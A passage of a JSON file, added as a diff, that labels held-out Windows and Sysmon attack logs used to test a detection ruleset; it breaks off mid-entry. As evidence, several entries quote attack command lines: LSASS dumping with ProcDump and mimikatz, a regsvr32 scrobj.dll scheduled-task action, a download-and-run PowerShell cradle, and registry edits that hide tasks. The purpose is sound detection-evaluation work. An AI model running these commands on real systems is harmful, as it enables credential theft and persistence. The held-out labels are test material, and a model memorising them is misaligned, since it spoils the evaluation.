@@ -1,0 +1,2487 @@
+{
+ "format": 1,
+ "protocol": "Files added to the catalog after the rules were changed on the in-sample files, and labelled before RASD first replayed them: by a reviewer who had no access to the rules, tests, catalog or results, from the raw events and each detection's documented scope (its README). attack: the recorded attack produced an event inside the documented scope, so the detection must fire. other: non-attack activity (the lab's harness, admin tools) produced in-scope events. scope, telemetry, blind-spot: why the detection is not expected to fire. The catalog's expect and quiet entries for these files are taken from these labels unchanged.",
+ "selection": "Every Splunk Attack Data file under the folders of the techniques RASD covers at the pinned commit - listed in the upstream metadata or not - that was not in the catalog and holds Windows Sysmon, Security or System events or Sysmon for Linux events in a format RASD reads (XML, Splunk's classic WinEventLog text, NXLog JSON, EVTX inside a zip), up to 60 MB. Left out: one 278 MB file; a tar.gz that is a byte-for-byte copy of the NXLog JSON file held out here; the capattack zip's System log, which holds no record, and its PowerShell and other logs; and twelve files that are in the catalog in-sample because they were read before any label was written: two T1190 Sysmon for Linux files read with the first in-sample set before the rule changes; the eight classic PurpleSharp spray exports, used in round two to build and check the classic reader (a structural check of field names against the XML reader on the same event types - they are other runs of the XML scenarios, with 20 attempts where the XML exports have 50, so not a record-by-record comparison); and two T1059.001 files the selection first missed because the upstream metadata calls them PowerShell logs, which a review replayed while checking the selection. Files holding only PowerShell, Task Scheduler, NTLM or Exchange management events, auditd, osquery, network, web, cloud or vendor formats hold nothing a RASD rule reads.",
+ "rounds": [
+  {
+   "labels": "H01-H44",
+   "labelled": "2026-10-14",
+   "note": "XML files the upstream metadata lists",
+   "first_replay": {
+    "expected": 8,
+    "met": 8,
+    "missed": []
+   }
+  },
+  {
+   "labels": "H45-H88",
+   "labelled": "2026-10-14",
+   "note": "files the upstream metadata does not list, most of them in the classic text format, labelled against the READMEs as corrected after the first round",
+   "first_replay": {
+    "expected": 18,
+    "met": 16,
+    "copies": [
+     "H75 T1070.001_event_log_clearing fired only on a record of H73, an earlier held-out file: it is not counted in the totals"
+    ],
+    "missed": [
+     "H50 T1053.005_powershell_scheduled_task_creation: a reader bug, fixed; H50 taken out of the held-out set",
+     "H86 T1558.003_kerberoasting_rc4_tgs: the rule drops tickets requested from the domain controller itself"
+    ]
+   }
+  },
+  {
+   "labels": "H89-H106",
+   "labelled": "2026-10-14",
+   "note": "the T1190 folder's Windows and Linux telemetry, left out of the first two rounds because RASD's T1190 rules read web logs although the other rules read these files; the NXLog JSON scheduled-task file; the Sysmon and Security logs inside a capattack zip. Labelled against the READMEs as corrected after round two",
+   "first_replay": {
+    "expected": 3,
+    "met": 3,
+    "missed": []
+   }
+  }
+ ],
+ "redacted": "passwords on command lines, a 64-character hex argument and one offensive task name, in the evidence and summaries only",
+ "demoted": {
+  "H50": "the first replay missed Register-ScheduledTask because the classic reader kept only the first line of a multi-line command line (the cmdlet was on the sixth); the reader was fixed and the miss now fires, so this file is no longer held out"
+ },
+ "files": [
+  {
+   "label": "H01",
+   "dataset": "splunk/T1003.001/atomic_red_team/procdump_windows-security",
+   "sha256": "86be8a91228678b0639f5cc192722b40acb81f06eb998bbc34916cf08f436abd",
+   "summary": "Atomic Red Team T1003.001 on win-host-mhaag: ProcDump (procdump.exe -> procdump64.exe) dumps LSASS with -ma and -mm to C:\\Windows\\Temp\\lsass_dump.dmp, launched by cmd.exe from PowerShell, plus one Invoke-AtomicTest prerequisite check (Test-Path). Security 4688 only (10 records); the comsvcs/other tests named in the description are not in the file.",
+   "labels": [
+    {
+     "detection": "T1003.001_lsass_memory_access",
+     "label": "telemetry",
+     "evidence": [
+      "EventRecordID 2786588: Security 4688, NewProcessName C:\\AtomicRedTeam\\atomics\\T1003.001\\bin\\procdump.exe, CommandLine \"procdump.exe -accepteula -ma lsass.exe C:\\Windows\\Temp\\lsass_dump.dmp\", parent cmd.exe",
+      "EventRecordID 2786592: Security 4688, procdump64.exe (parent procdump.exe) \"-accepteula -ma lsass.exe ...\"; same pattern at RIDs 2779946/2779952 (-ma) and 2786610/2786614 (-mm)",
+      "File contains only Security 4688; no Sysmon EID 10 (ProcessAccess)"
+     ],
+     "reason": "ProcDump opening LSASS to dump it is exactly what the rule targets, but the rule reads only Sysmon EID 10 with TargetImage lsass.exe (Telemetry required) and the file has none."
+    }
+   ]
+  },
+  {
+   "label": "H02",
+   "dataset": "splunk/T1003.001/snapattack/snapattack",
+   "sha256": "c22994ec5fa481609dfbb3403dc51d803cb1f0665d3aab29da8f5e8a9766f4af",
+   "summary": "SnapAttack collection of LSASS credential-access samples from several hosts (most records exported twice): WER \"Shtinkering\" (LocalDumps DumpType=2, WerFault writing lsass.exe.668.dmp), PPLBlade \"dothatlsassthing\" with its driver service, mimikatz sekurlsa/lsadump run from PowerShell, PsExec copying mimikatz to \\\\DC1, and an Invoke-Mimikatz script-block fragment. Sysmon 11/13, Security 4688, PowerShell 4104; no Sysmon 10, no 7045.",
+   "labels": [
+    {
+     "detection": "T1003.001_lsass_memory_access",
+     "label": "telemetry",
+     "evidence": [
+      "EventRecordID 17825 (ord 2/16): Sysmon 11, C:\\Windows\\system32\\WerFault.exe -> C:\\Windows\\System32\\config\\systemprofile\\AppData\\Local\\CrashDumps\\lsass.exe.668.dmp",
+      "EventRecordID 17107 (ord 3/17): Sysmon 13, reg.exe sets HKLM\\SOFTWARE\\Microsoft\\Windows\\Windows Error Reporting\\LocalDumps\\DumpType = 2",
+      "EventRecordID 140180: Security 4688, C:\\Users\\user\\PPLBlade.exe \"--mode dothatlsassthing --obfuscate\", parent powershell.exe",
+      "EventRecordID 1080676: Security 4688, C:\\Users\\doadmin\\Downloads\\mimikatz_trunk\\x64\\mimikatz.exe \"privilege::debug sekurlsa::logonpasswords exit\"",
+      "No Sysmon EID 10 in the file"
+     ],
+     "reason": "Several LSASS-dumping attacks are recorded, but the rule reads only Sysmon EID 10 against lsass.exe, which the file lacks; the .dmp file creation (EID 11) is the README's complementary signal, not this rule's input."
+    },
+    {
+     "detection": "T1569.002_suspicious_service_installation",
+     "label": "telemetry",
+     "evidence": [
+      "EventRecordID 109565 (ord 7/8/20): Security 4688, C:\\PSTools\\PsExec.exe \"/accepteula \\\\DC1 -c ...\\AppData\\Local\\Temp\\mimikatz\\x64\\mimikatz.exe ...\" (installs PSEXESVC on DC1)",
+      "EventRecordID 1412 (ord 5/18): Sysmon 13, services.exe sets HKLM\\System\\CurrentControlSet\\Services\\PPLBlade\\ImagePath = \\??\\C:\\users\\user\\PPLBLADE.SYS",
+      "No System 7045 or Security 4697 in the file (and no events from DC1)"
+     ],
+     "reason": "PsExec remote execution creates the default PSEXESVC service on the target (susp_name), but the rule reads System 7045 / Security 4697 and the file has neither. The PPLBlade driver service (ImagePath under C:\\users\\user, not a listed writable path, no listed name) would not match a fingerprint even with 7045."
+    }
+   ]
+  },
+  {
+   "label": "H03",
+   "dataset": "splunk/T1021.006/compmgtm_access/compmgmt_load",
+   "sha256": "31159e87ede769315c099aada31b6632dd4f8a2fd982efdcda1daa879e2fdbc3",
+   "summary": "An administrator on ar-win-dc opens Computer Management (mmc.exe compmgmt.msc) from Explorer, once locally and once against remote host 10.0.1.15 (/computer:). Two Sysmon 1 records, client side only.",
+   "labels": [
+    {
+     "detection": "T1021.006_wsmprovhost_suspicious_child",
+     "label": "scope",
+     "evidence": [
+      "EventRecordID 26237: Sysmon 1, C:\\Windows\\System32\\mmc.exe \"compmgmt.msc /computer:10.0.1.15\", ParentImage C:\\Windows\\explorer.exe, host ar-win-dc",
+      "EventRecordID 26231: Sysmon 1, mmc.exe \"C:\\Windows\\system32\\compmgmt.msc\", ParentImage C:\\Windows\\explorer.exe"
+     ],
+     "reason": "Remote administration launched on the client. The rule keys only on cmd.exe / encoded PowerShell / proxy binaries whose parent is wsmprovhost.exe or winrshost.exe on the WinRM target; here the parent is explorer.exe, mmc.exe is in no selection, and compmgmt.msc /computer: uses RPC/DCOM rather than a WinRM session (cf. the documented gap \"Other remote execution - WMI and DCOM\")."
+    }
+   ]
+  },
+  {
+   "label": "H04",
+   "dataset": "splunk/T1021.006/wsman_trustedhost/wsman_pwh",
+   "sha256": "17654c941a11e47ee26c7d316ec1c29b684b7dde95d1c23eb2c6473b318c1c66",
+   "summary": "Single PowerShell 4104 on ar-win-2: Set-Item WSMan:\\localhost\\Client\\TrustedHosts -Value '127.0.0.2' -Concatenate -Force (WinRM client TrustedHosts modification).",
+   "labels": [
+    {
+     "detection": "T1021.006_wsmprovhost_suspicious_child",
+     "label": "scope",
+     "evidence": [
+      "EventRecordID 172103: PowerShell 4104, ScriptBlockText \\\"Set-Item WSMan:\\localhost\\Client\\TrustedHosts -Value '127.0.0.2' -Concatenate -Force\\\", host ar-win-2",
+      "Only record in the file; no Sysmon EID 1"
+     ],
+     "reason": "Changing TrustedHosts is WinRM client configuration done by a cmdlet; it starts no process under wsmprovhost.exe/winrshost.exe, which is all the rule keys on, so it is outside scope even with Sysmon EID 1 (which the file also lacks)."
+    }
+   ]
+  },
+  {
+   "label": "H05",
+   "dataset": "splunk/T1053.005/asyncrat_highest_priv_schtasks/sysmon",
+   "sha256": "068cba2851e13e3708d353247c37891e2cdc5b78bc94f5d7099ada494ae644d9",
+   "summary": "Attack-range Sysmon: AsyncRAT (Downloads\\asyncrat\\bin\\asyncrat.bin, started from dnSpy) opens LSASS with 0x1410 and persists through cmd /c schtasks /create /sc onlogon /rl highest pointing to AppData\\Roaming\\asyncrat.exe; the rest is Splunk forwarder, Firefox and OS noise.",
+   "labels": [
+    {
+     "detection": "T1053.005_schtasks_suspicious_creation",
+     "label": "attack",
+     "evidence": [
+      "EventRecordID 81650: Sysmon 1, C:\\Windows\\SysWOW64\\schtasks.exe (OriginalFileName sctasks.exe), CommandLine: schtasks  /create /f /sc onlogon /rl highest /tn \"Roaming\" /tr '\"C:\\Users\\Administrator\\AppData\\Roaming\\asyncrat.exe\"'",
+      "EventRecordID 81636: Sysmon 1, its parent C:\\Windows\\SysWOW64\\cmd.exe \"/c schtasks /create /f /sc onlogon /rl highest /tn \"Roaming\" ... & exit\", started by C:\\Users\\Administrator\\Downloads\\asyncrat\\bin\\asyncrat.bin (OriginalFileName Stub.exe)"
+     ],
+     "reason": "schtasks.exe (path and OriginalFileName) with /create as a switch and an action under AppData, i.e. susp_writable_path; no documented filter covers it."
+    },
+    {
+     "detection": "T1003.001_lsass_memory_access",
+     "label": "attack",
+     "evidence": [
+      "EventRecordID 79477: Sysmon 10, SourceImage C:\\Users\\Administrator\\Downloads\\asyncrat\\bin\\asyncrat.bin, TargetImage C:\\Windows\\system32\\lsass.exe, GrantedAccess 0x1410, CallTrace ntdll|wow64|KERNELBASE|UNKNOWN (JIT)|clr.dll, no System.ni.dll frame",
+      "EventRecordID 81027: Sysmon 10, second asyncrat.bin run (PID 4816, the process that launched the schtasks chain), TargetImage lsass.exe, GrantedAccess 0x1410",
+      "Out of mask scope, for completeness: svchost.exe 0x1400 (38 events, first EventRecordID 33965) and aurora-agent.exe 0x40 (89 events, first EventRecordID 34088) carry no PROCESS_VM_READ"
+     ],
+     "reason": "0x1410 is PROCESS_VM_READ plus query rights from a binary that is not csrss, wininit, WmiPrvSE or the Defender platform scanner; the .NET process-listing filter is documented for Windows PowerShell with a System.ni.dll frame and does not apply. Probably the RAT enumerating processes rather than dumping, but the rule is mask-based and should fire."
+    }
+   ]
+  },
+  {
+   "label": "H06",
+   "dataset": "splunk/T1053.005/atomic_red_team/4698_windows-security",
+   "sha256": "caecdaf2af3ae17bb835f63f7bee7c7e6269f00d17aa6fe5423aaf8d0abb9c0a",
+   "summary": "Fourteen Security 4698 events (DC and member host): two hand-made tasks, \\atomic (c:\\windows\\temp\\atomic.exe) and \\test (calc.exe), registered through the Task Scheduler GUI, plus vendor/OS tasks (Edge Update, Visual Studio, Npcap, Aurora agent, Firefox agent, CreateExplorerShellUnelevatedTask). The Atomic test tasks named in the upstream description are not in the file, and there is no process creation.",
+   "labels": [
+    {
+     "detection": "T1053.005_schtasks_suspicious_creation",
+     "label": "blind-spot",
+     "evidence": [
+      "EventRecordID 1006508: Security 4698, task \\atomic, Exec.Command c:\\windows\\temp\\atomic.exe, Author ATTACKRANGE\\administrator, Date 2023-01-26T21:10:13.6133794, CalendarTrigger StartBoundary 2023-01-26T21:10:01.4894489, ExecutionTimeLimit P3D, Principals before Settings",
+      "EventRecordID 1005807: Security 4698, task \\test, Exec.Command calc.exe, same Task Scheduler wizard fingerprint (fractional-second Date and StartBoundary, P3D)"
+     ],
+     "reason": "Windows\\Temp in the \\atomic action would be susp_writable_path on a schtasks.exe command line, but the XML is the Task Scheduler wizard's (schtasks.exe writes whole-second Date/StartBoundary and PT72H, as in H08), i.e. COM API registration, which the rule documents as never spawning schtasks.exe (cover with 4698). The file also has no process creation at all; the vendor tasks point into Program Files."
+    }
+   ]
+  },
+  {
+   "label": "H07",
+   "dataset": "splunk/T1053.005/atomic_red_team/4698_shell_windows-security",
+   "sha256": "a3ad53ea74a834f1fc90f4844766c0be5ecd688e7768f4b4b5af25eb65a0ecff",
+   "summary": "Three Security 4698 events: a hand-made daily task \\NOTAPT (member host) / \\notAPT (DC) running powershell.exe get-process with the description 'This is not the APT', registered through the Task Scheduler GUI, plus the OS task CreateExplorerShellUnelevatedTask; no process creation.",
+   "labels": [
+    {
+     "detection": "T1053.005_schtasks_suspicious_creation",
+     "label": "blind-spot",
+     "evidence": [
+      "EventRecordID 855107: Security 4698 on win-host-mhaag-attack-range-569, task \\NOTAPT, Exec powershell.exe get-process, Description 'This is not the APT', Date 2023-02-03T16:45:06.2161909, StartBoundary 2023-02-03T16:44:52.6954792, ExecutionTimeLimit P3D",
+      "EventRecordID 3554855: Security 4698 on the DC, task \\notAPT, Exec powershell.exe get-process, same wizard fingerprint",
+      "EventRecordID 3552416: Security 4698, \\CreateExplorerShellUnelevatedTask (C:\\Windows\\Explorer.EXE /NOUACCHECK), OS component"
+     ],
+     "reason": "A PowerShell action is susp_action when it sits on a schtasks.exe command line, but these tasks were registered through the GUI/COM API (Description field, fractional-second timestamps, P3D), which the rule documents as never spawning schtasks.exe; the file also contains no process creation."
+    }
+   ]
+  },
+  {
+   "label": "H08",
+   "dataset": "splunk/T1053.005/lateral_movement/windows-security",
+   "sha256": "fdfe5a2436d1ed610384101a4b1291509f66d5130b4e6bc0f459f202e3a2831a",
+   "summary": "Target-side Security log of remote scheduled-task lateral movement: 4698 registers \\evilTask (C:\\metE.exe as S-1-5-18, TimeTrigger) and 4699 deletes it 10 s later; the schtasks.exe /S command ran on the source host and is not in the file.",
+   "labels": [
+    {
+     "detection": "T1053.005_schtasks_suspicious_creation",
+     "label": "telemetry",
+     "evidence": [
+      "EventRecordID 3702190: Security 4698, task \\evilTask, Author ATTACKRANGE\\Administrator, Date 2021-11-12T17:16:34 and PT72H (schtasks.exe format), Principal UserId S-1-5-18, Exec.Command C:\\metE.exe",
+      "EventRecordID 3702198: Security 4699, \\evilTask deleted at 17:16:44"
+     ],
+     "reason": "Remote creation as SYSTEM is susp_system_remote, but it is only visible on the schtasks.exe command line of the source host; the file holds the target's 4698/4699 only, and the rule reads process creation (4698 is a documented complement, not its input)."
+    }
+   ]
+  },
+  {
+   "label": "H09",
+   "dataset": "splunk/T1053.005/lateral_movement_lolbas/windows-sysmon",
+   "sha256": "722963980c277664e31993c1b4c4007906a014a9a718dd21cce04cf19e2ef799",
+   "summary": "Sysmon from a DC and a member host: Administrator on win-dc-128 runs schtasks /S 10.0.1.15 /create /tn evilTask with a regsvr32 /i:evil.sct scrobj.dll (Squiblydoo) action as SYSTEM, then /run and /delete; everything else is Splunk forwarder and OS noise.",
+   "labels": [
+    {
+     "detection": "T1053.005_schtasks_suspicious_creation",
+     "label": "attack",
+     "evidence": [
+      "EventRecordID 115944957: Sysmon 1 on win-dc-128, C:\\Windows\\System32\\schtasks.exe (OriginalFileName sctasks.exe), CommandLine: Schtasks  /S 10.0.1.15 /create /tn evilTask /tr \"C:\\Windows/system32/regsvr32.exe /u /n /s /i:evil.sct scrob... ... /ru system /sc once /st 00:00",
+      "EventRecordID 115945010 and 115945076: Sysmon 1, Schtasks /S 10.0.1.15 /run /tn evilTask and /delete /tn evilTask /F (neither is /create or /change)"
+     ],
+     "reason": "/create as a switch with regsvr32 in the action (susp_action) and /S <host> with /ru system (susp_system_remote); no documented filter applies."
+    }
+   ]
+  },
+  {
+   "label": "H10",
+   "dataset": "splunk/T1053.005/schtask_shutdown/windows-sysmon",
+   "sha256": "cafa411c6706fab418e8f26735a96298de18bc7d041d8702a8c2ad0c819eb98e",
+   "summary": "Sysmon from a DC: Ansible WinRM provisioning (winrshost -> cmd /C PowerShell -EncodedCommand, including an Ansible reboot), Caldera agents started at boot from C:\\Users\\Public, an RDP logon with the EC2Launch wallpaper script, then an interactive cmd runs schtasks /create /tn 'auto shutdown my computer' /tr 'shutdown -s'.",
+   "labels": [
+    {
+     "detection": "T1053.005_schtasks_suspicious_creation",
+     "label": "scope",
+     "evidence": [
+      "EventRecordID 7839: Sysmon 1, C:\\Windows\\System32\\schtasks.exe (OriginalFileName sctasks.exe), parent cmd.exe opened through RuntimeBroker, CommandLine: schtasks  /create /sc once /tn \"auto shutdown my computer\" /tr \"shutdown -s\" /st 15:30"
+     ],
+     "reason": "The /create switch is there but the action (shutdown -s) matches no susp_* selection: no %TEMP%/%APPDATA%, PowerShell, cmd /c, mshta/wscript/cscript/regsvr32 or URL, no user-writable path, and not remote creation as SYSTEM."
+    },
+    {
+     "detection": "T1021.006_wsmprovhost_suspicious_child",
+     "label": "other",
+     "evidence": [
+      "EventRecordID 60: Sysmon 1, C:\\Windows\\System32\\cmd.exe, ParentImage C:\\Windows\\System32\\winrshost.exe, CommandLine: C:\\Windows\\system32\\cmd.exe /C PowerShell -NoProfile -NonInteractive -ExecutionPolicy Unrestricted -EncodedCommand (payload length 2700)",
+      "Nine cmd.exe children of winrshost.exe in all: EventRecordIDs 60, 186, 313, 440, 479, 573, 655, 2719, 2838",
+      "EventRecordID 529: Sysmon 1, shutdown.exe /r /t 2 /c \"Reboot initiated by Ansible\" inside the same WinRM chain"
+     ],
+     "reason": "cmd.exe under winrshost.exe is susp_shell, so an alert is expected, but the session is Ansible's WinRM runner provisioning the lab (exec_wrapper, win_reboot, post-reboot whoami), not the recorded attack."
+    },
+    {
+     "detection": "T1059.001_powershell_encoded_command",
+     "label": "other",
+     "evidence": [
+      "EventRecordID 73: Sysmon 1, C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe (OriginalFileName PowerShell.EXE), parent cmd.exe under winrshost.exe, flag -EncodedCommand, payload length 2700",
+      "13 powershell.exe launches with -EncodedCommand (payload lengths 16 to 2700): EventRecordIDs 73, 93, 199, 219, 326, 346, 453, 492, 512, 586, 668, 2732, 2851"
+     ],
+     "reason": "-EncodedCommand with a Base64 blob of 16+ characters is in scope and the only documented filter is the SCCM parent; every one belongs to the Ansible WinRM chain (decoded locally, not reproduced: Ansible exec_wrapper, reboot/uptime checks, whoami), i.e. lab automation."
+    }
+   ]
+  },
+  {
+   "label": "H11",
+   "dataset": "splunk/T1053.005/schtask_system/windows-sysmon",
+   "sha256": "598b761436a1a39b1561c3f0ce59cd8b0439601f4137c73aaf32a4f9bc35077e",
+   "summary": "Single Sysmon 1 event: from an interactive PowerShell, Administrator runs schtasks /Create /SC ONLOGON /TN ReverseShell with a payload EXE in C:\\Users\\seneo\\Documents, to run as NT AUTHORITY\\SYSTEM.",
+   "labels": [
+    {
+     "detection": "T1053.005_schtasks_suspicious_creation",
+     "label": "scope",
+     "evidence": [
+      "EventRecordID 19690696: Sysmon 1, C:\\Windows\\System32\\schtasks.exe (OriginalFileName sctasks.exe), parent powershell.exe, CommandLine: ...schtasks.exe\" /Create /SC ONLOGON /TN ReverseShell /TR C:\\Users\\seneo\\Documents\\payload-x64.exe /RU \"NT AUTHORITY\\SYSTEM\""
+     ],
+     "reason": "The action is an EXE in a user's Documents folder, which is not in the susp_writable_path list (AppData, ProgramData, Users\\Public, Windows\\Temp, Downloads) and is no interpreter or URL; /RU SYSTEM only counts together with /S <host>, and this creation is local."
+    }
+   ]
+  },
+  {
+   "label": "H12",
+   "dataset": "splunk/T1053.005/svchost_lolbas_execution_process_spawn/windows-xml",
+   "sha256": "44d9f8b1c6d7e29221c87bfbc57e72a585d5a04f1d3686d6c012dfb9e587a342",
+   "summary": "Doctored Sysmon/4688 sample in which cmd.exe appears as C:\\Windows\\System32\\Ftp.exe and the Splunk forwarder's splunkd.exe as ...\\SplunkUniversalForwarder\\bin\\svchost.exe, built to show svchost spawning a LOLBin; it also records an interactive sc.exe create MockService binPath= Ftp.exe (7045, Sysmon 13, 4104) that services.exe then starts, and Invoke-AtomicRedTeam module script blocks.",
+   "labels": [
+    {
+     "detection": "T1569.002_suspicious_service_installation",
+     "label": "scope",
+     "evidence": [
+      "EventRecordID 168102: System 7045, ServiceName MockService, ImagePath Ftp.exe, user mode service, auto start, LocalSystem",
+      "EventRecordID 169691 (Sysmon 1) / 1800360 (4688) / 173495 (4104): \"C:\\Windows\\system32\\sc.exe\" create MockService binPath= Ftp.exe start= auto from powershell.exe; EventRecordID 169694: services.exe starts Ftp.exe"
+     ],
+     "reason": "The installed service runs a bare LOLBin name: no command interpreter or share path, no user-writable path, no .bat/.cmd, not a PsExec/PAExec/RemCom/CSExec/BTOBTO name and not %SystemRoot%\\<8 random letters>.exe, so none of the documented fingerprints matches."
+    },
+    {
+     "detection": "T1053.005_schtasks_suspicious_creation",
+     "label": "scope",
+     "evidence": [
+      "EventRecordID 1482358 and 653331: Security 4688, C:\\Windows\\System32\\svchost.exe -> \"C:\\Windows\\system32\\Ftp.exe\" /d /c C:\\Windows\\system32\\silcollector.cmd configure (a scheduled task's command run by the Task Scheduler host)",
+      "No schtasks.exe process creation (Sysmon 1 or 4688) anywhere in the file"
+     ],
+     "reason": "The sample's T1053.005 behaviour is task execution (a svchost task host spawning a LOLBin); the rule only covers task creation or change through schtasks.exe."
+    }
+   ]
+  },
+  {
+   "label": "H13",
+   "dataset": "splunk/T1053.005/taskschedule/sd_delete_windows-sysmon",
+   "sha256": "dc674b9030db4675edb2c205c71e8366850e7c7dc8ab3d94de1001a2c35a691f",
+   "summary": "Sysmon from two hosts: scheduled tasks (spawn, ATOMIC-T1053.005, T1053_005_OnLogon/OnStartup/WMI, AtomicTask, haag) are registered by the Schedule service (TaskCache registry writes) and then hidden by deleting their SD value with reg.exe, started from PowerShell, cmd and a no-argument rundll32.exe running as SYSTEM; the processes that created the tasks are not in the export.",
+   "labels": [
+    {
+     "detection": "T1053.005_schtasks_suspicious_creation",
+     "label": "blind-spot",
+     "evidence": [
+      "EventRecordID 847381: Sysmon 1, reg.exe as SYSTEM, CommandLine: reg delete \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tree\\spawn\" /v SD /f",
+      "EventRecordID 853567: Sysmon 12 DeleteValue by reg.exe, HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tree\\T1053_005_OnLogon\\SD (7 SD deletions: spawn, ATOMIC-T1053.005, T1053_005_OnLogon, T1053_005_OnStartup, T1053_005_WMI, AtomicTask, haag)",
+      "EventRecordID 844103: Sysmon 12 CreateKey by C:\\Windows\\system32\\svchost.exe, ...\\TaskCache\\Tree\\T1053_005_OnLogon: the registration, with no schtasks.exe process creation in the file"
+     ],
+     "reason": "Hiding tasks by deleting the TaskCache SD value is the registry-based 'hidden task' tradecraft the rule lists as a gap (it names TaskCache-based hidden tasks; here applied to existing tasks). The registrations themselves appear only as Schedule-service registry writes because the export keeps only reg.exe, cmd.exe and conhost.exe process creations, so no schtasks.exe /create is present either."
+    },
+    {
+     "detection": "T1218.011_rundll32_suspicious_execution",
+     "label": "telemetry",
+     "evidence": [
+      "EventRecordID 805849: Sysmon 1, reg.exe (reg delete ...\\TaskCache\\Tree\\spawn\\SD) as SYSTEM, ParentImage C:\\Windows\\System32\\rundll32.exe, ParentCommandLine C:\\Windows\\System32\\rundll32.exe (no arguments), parent PID 5452",
+      "Ten reg.exe children of rundll32 PID 5452 and one of PID 964 (EventRecordID 1202001), all with an argument-less rundll32.exe as parent"
+     ],
+     "reason": "An argument-less rundll32.exe acting as the attacker's SYSTEM process is susp_noargs, but its own process-creation record (Image rundll32.exe), which the rule matches, is not in the file; it is visible only through the children's Parent* fields."
+    }
+   ]
+  },
+  {
+   "label": "H14",
+   "dataset": "splunk/T1053.005/winevent_scheduled_task_created_to_spawn_shell/windows-xml",
+   "sha256": "a6c0a6f8cfffd860b8c3d41ff37f9b6d926ecd6a00ea1f77358569d39943384e",
+   "summary": "Single Security 4698 on the DC: \\OneLinerTestTask5, a logon-triggered task running c:\\\\temp\\\\cmd.exe, registered with only a URI in RegistrationInfo (no Author/Date), the shape of a ScheduledTasks cmdlet or COM registration; no process creation or script-block events.",
+   "labels": [
+    {
+     "detection": "T1053.005_schtasks_suspicious_creation",
+     "label": "blind-spot",
+     "evidence": [
+      "EventRecordID 1798744: Security 4698, task \\OneLinerTestTask5, RegistrationInfo holds only <URI> (schtasks.exe always writes Date and Author, cf. H08), LogonTrigger, Principal ATTACKRANGE\\Administrator InteractiveToken, Exec.Command c:\\\\temp\\\\cmd.exe"
+     ],
+     "reason": "Registered through the cmdlets/COM API rather than schtasks.exe, which the rule documents as outside its reach (COM/WMI never spawn schtasks.exe; the cmdlets have their own rule). The action would miss every susp_* selection anyway (c:\\temp is not in the writable-path list, no /c), and the file has no process creation."
+    },
+    {
+     "detection": "T1053.005_powershell_scheduled_task_creation",
+     "label": "telemetry",
+     "evidence": [
+      "EventRecordID 1798744: Security 4698 is the only event in the file; no Sysmon 1, Security 4688 or PowerShell 4104"
+     ],
+     "reason": "The cmdlet-style XML and the task name point to a Register-ScheduledTask one-liner, which with an inline New-ScheduledTaskAction -Execute is susp_action, but the file holds only the 4698 outcome, not the command line or script block the rule reads."
+    }
+   ]
+  },
+  {
+   "label": "H15",
+   "dataset": "splunk/T1053.005/winevent_scheduled_task_with_suspect_name/windows-xml",
+   "sha256": "4af0e2d1b8dfae2e6e7cd18dcb85db50a028effc8d46f9fe3cfc21b633b2e6c0",
+   "summary": "Single Security 4698 (newer build with ClientProcessId/RpcCallClientLocality fields): user ATTACKER registers \\WallPaperChangeApp, a daily task running calc.exe; the sample exists for its known-malicious task name, and the XML is the Task Scheduler wizard's.",
+   "labels": [
+    {
+     "detection": "T1053.005_schtasks_suspicious_creation",
+     "label": "blind-spot",
+     "evidence": [
+      "EventRecordID 355503124: Security 4698, task \\WallPaperChangeApp, Author ATTACK_RANGE\\ATTACKER, Date 2025-02-06T15:42:02.105785, CalendarTrigger StartBoundary 2025-02-06T15:41:26.5273439, ExecutionTimeLimit P3D, Principals before Settings, Exec.Command calc.exe, ClientProcessId 24712"
+     ],
+     "reason": "The wizard fingerprint (fractional-second Date/StartBoundary, P3D) means GUI/COM registration, which the rule documents as never spawning schtasks.exe; even through schtasks.exe a calc.exe action matches no susp_* selection and the rule does not look at task names; the file has no process creation."
+    }
+   ]
+  },
+  {
+   "label": "H16",
+   "dataset": "splunk/T1059.001/atomic_red_team/captcha_windows-sysmon",
+   "sha256": "2349326b9042ba212dc16a4764a2cd1fbfa318a792c5591594b77bbfd20ddc9e",
+   "summary": "One Sysmon 1 event: a ClickFix-style fake CAPTCHA lure. explorer.exe (Run dialog) starts PowerShell hidden with a plain-text 'iex (irm <url>)' download cradle followed by an 'I am not a robot' comment.",
+   "labels": [
+    {
+     "detection": "T1059.001_powershell_encoded_command",
+     "label": "blind-spot",
+     "evidence": [
+      "EventRecordID 591513: Sysmon 1, Image powershell.exe (OriginalFileName PowerShell.EXE), CommandLine \"...PowerShell.exe\" -NoP -WindowStyle Hidden -Command \"iex (irm 'https://aatox[.]com/verify/45.ps1')\" # ...(198 chars), parent explorer.exe",
+      "No -e/-ec/-en* parameter followed by a Base64 blob anywhere in the command line"
+     ],
+     "reason": "The command is not encoded. It is an IEX download cradle inside a plain -Command, which the README lists under Evasion & coverage gaps ('Obfuscation inside a non-encoded command (IEX, ...)', covered by 4104)."
+    }
+   ]
+  },
+  {
+   "label": "H17",
+   "dataset": "splunk/T1059.001/atomic_red_team/windows-security-2",
+   "sha256": "3223e7385a0325fc0a50d3103c1cc690aa57a4d04ec19a0259054af32d13448c",
+   "summary": "One Security 4688 event from an Atomic Red Team T1059.001 run: cmd.exe starts PowerShell with a plain-text WebClient.DownloadString command.",
+   "labels": [
+    {
+     "detection": "T1059.001_powershell_encoded_command",
+     "label": "scope",
+     "evidence": [
+      "EventRecordID 525059: Security 4688, NewProcessName ...\\powershell.exe, CommandLine powershell  -Command \"(New-Object System.Net.WebClient).DownloadString('https://example.com')\", ParentProcessName cmd.exe"
+     ],
+     "reason": "PowerShell execution (T1059.001), but with a plain -Command and no encoded-command parameter, so the event falls outside the scope ('a dash-like prefix, then e, ec or en*, then whitespace and a Base64 blob of 16+ chars'). 4688 is readable after remapping."
+    }
+   ]
+  },
+  {
+   "label": "H18",
+   "dataset": "splunk/T1059.001/atomic_red_team/enableat_windows-sysmon",
+   "sha256": "277289fa911c6c7999f338f735c29a9811d03249e8d9584ec722af85aa051ded",
+   "summary": "Two Sysmon 13 events on two hosts: powershell.exe sets HKLM\\...\\Schedule\\Configuration\\EnableAt = 1, which re-enables the legacy at.exe scheduler. The file holds no process creation, no task creation and no Run key.",
+   "labels": [
+    {
+     "detection": "T1059.001_powershell_encoded_command",
+     "label": "telemetry",
+     "evidence": [
